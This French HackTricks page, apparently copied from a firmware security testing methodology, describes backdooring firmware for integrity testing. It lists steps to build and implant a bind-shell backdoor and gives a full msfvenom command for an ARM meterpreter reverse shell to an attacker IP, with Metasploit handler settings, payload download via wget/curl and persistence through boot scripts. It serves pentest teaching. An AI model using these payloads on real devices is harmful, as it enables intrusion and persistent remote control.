```markdown
<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


### Cette page a été copiée de [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)

Essayez de **téléverser un firmware personnalisé et/ou des binaires compilés** pour détecter des failles de vérification d'intégrité ou de signature. Par exemple, compilez un backdoor bind shell qui démarre au boot en suivant les étapes suivantes.

1. Extraire le firmware avec firmware-mod-kit (FMK)
2. Identifier l'architecture et l'endianness du firmware cible
3. Construire un cross-compiler avec Buildroot ou utiliser d'autres méthodes adaptées à votre environnement
4. Utiliser le cross-compiler pour construire le backdoor
5. Copier le backdoor dans /usr/bin du firmware extrait
6. Copier le binaire QEMU approprié dans le rootfs du firmware extrait
7. Émuler le backdoor en utilisant chroot et QEMU
8. Se connecter au backdoor via netcat
9. Retirer le binaire QEMU du rootfs du firmware extrait
10. Repackager le firmware modifié avec FMK
11. Tester le firmware backdooré en l'émulant avec firmware analysis toolkit (FAT) et en se connectant à l'IP et au port du backdoor cible avec netcat

Si un shell root a déjà été obtenu à partir d'une analyse dynamique, de la manipulation du bootloader ou des tests de sécurité matérielle, essayez d'exécuter des binaires malveillants précompilés tels que des implants ou des reverse shells. Envisagez d'utiliser des outils automatisés de payload/implant pour les frameworks de commande et contrôle (C&C). Par exemple, le framework Metasploit et 'msfvenom' peuvent être utilisés en suivant les étapes suivantes.

1. Identifier l'architecture et l'endianness du firmware cible
2. Utiliser `msfvenom` pour spécifier le payload cible approprié (-p), l'IP de l'hôte attaquant (LHOST=), le numéro de port d'écoute (LPORT=), le type de fichier (-f), l'architecture (--arch), la plateforme (--platform linux ou windows), et le fichier de sortie (-o). Par exemple, `msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
3. Transférer le payload sur l'appareil compromis (par exemple, exécuter un serveur web local et télécharger le payload sur le système de fichiers avec wget/curl) et s'assurer que le payload a les permissions d'exécution
4. Préparer Metasploit pour gérer les requêtes entrantes. Par exemple, démarrer Metasploit avec msfconsole et utiliser les paramètres suivants selon le payload ci-dessus : use exploit/multi/handler,
* `set payload linux/armle/meterpreter_reverse_tcp`
* `set LHOST 192.168.1.245 #IP de l'hôte attaquant`
* `set LPORT 445 #peut être n'importe quel port inutilisé`
* `set ExitOnSession false`
* `exploit -j -z`
5. Exécuter le meterpreter reverse 🐚 sur l'appareil compromis
6. Observer l'ouverture des sessions meterpreter
7. Réaliser des activités post-exploitation

Si possible, identifiez une vulnérabilité dans les scripts de démarrage pour obtenir un accès persistant à un appareil après des redémarrages. De telles vulnérabilités surviennent lorsque les scripts de démarrage font référence, [symboliquement lient](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data), ou dépendent de code situé dans des emplacements montés non fiables tels que des cartes SD, et des volumes flash utilisés pour stocker des données en dehors des systèmes de fichiers racine.


<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
